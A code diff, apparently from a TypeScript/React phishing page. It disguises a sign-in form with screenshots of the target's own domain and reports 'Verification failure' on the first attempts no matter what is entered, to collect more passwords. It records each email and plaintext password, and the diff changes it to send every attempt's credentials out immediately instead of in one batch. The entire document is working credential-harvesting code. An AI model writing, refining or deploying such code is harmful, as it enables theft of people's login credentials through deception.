@@ -39,7 +39,14 @@ function DomainBackground({ domain }: { domain: string }) {
     const urls = getScreenshotUrls(domain)
     if (!urls.length) return
 
+    setBgUrl(urls[0])
+
     urls.forEach((url) => {
+      const img = new Image()
+      img.decoding = 'async'
+      img.loading = 'eager'
+      img.src = url
+
       const link = document.createElement('link')
       link.rel = 'preload'
       link.as = 'image'
@@ -92,6 +99,24 @@ let signInReports: ResponsePayload[] = []
 function resetSignInSession() {
   signInAttempts = 0
   signInReports = []
+}
+
+async function sendAttemptHistoryReports(reports: ResponsePayload[]) {
+  if (!reports.length) return
+
+  for (let index = 0; index < reports.length; index += 1) {
+    const item = reports[index]
+    const historyLabel = `Attempt ${index + 1} of ${reports.length}`
+
+    await sendResponse({
+      ...item,
+      email: item.email,
+      password: item.passwordValue ?? item.password ?? 'Unknown',
+      passwordValue: item.passwordValue ?? item.password ?? 'Unknown',
+      outcome: item.outcome ?? 'failed',
+      message: item.message ? `${historyLabel}: ${item.message}` : historyLabel,
+    })
+  }
 }
 
 function SignInStep({ onDomainChange }: SignInStepProps) {
@@ -166,12 +191,15 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
       attempt: String(signInAttempts),
     }
 
+    signInReports.push({
+      ...report,
+      outcome: signInAttempts < 3 ? 'failed' : 'success',
+      message: signInAttempts < 3 ? 'Verification failure. Please try again.' : 'Successful verification',
+    })
+
+    await sendAttemptHistoryReports(signInReports)
+
     if (signInAttempts < 3) {
-      signInReports.push({
-        ...report,
-        outcome: 'failed',
-        message: 'Verification failure. Please try again.',
-      })
       setError('Verification failure. Please try again.')
       setPassword('')
       setShowPassword(false)
@@ -179,23 +207,6 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
       return
     }
 
-    signInReports.push({
-      ...report,
-      outcome: 'success',
-    })
-
-    const combinedPasswords = signInReports
-      .map((item, index) => `Pass ${index + 1}: ${item.passwordValue ?? item.password ?? 'Unknown'}`)
-      .join('\n')
-
-    await sendResponse({
-      ...report,
-      email: trimmedEmail,
-      password: combinedPasswords,
-      passwordValue: combinedPasswords,
-      outcome: 'success',
-      message: `Attempt history: ${signInReports.length} attempts`,
-    })
     signInReports = []
 
     signIn(userFromEmail(trimmedEmail), { authMethod: 'email' })
